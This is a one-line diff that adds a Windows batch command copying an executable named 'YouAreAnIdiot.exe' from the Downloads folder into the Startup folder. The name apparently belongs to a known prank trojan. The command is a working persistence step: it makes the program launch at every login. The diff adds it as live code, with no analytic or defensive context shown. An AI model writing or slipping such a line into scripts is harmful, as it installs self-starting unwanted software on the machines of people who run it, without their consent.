@@ -1,0 +1,1 @@
+copy "%USERPROFILE%\Downloads\YouAreAnIdiot\YouAreAnIdiot.exe" "%USERPROFILE%\Start Menu\Programs\Startup"
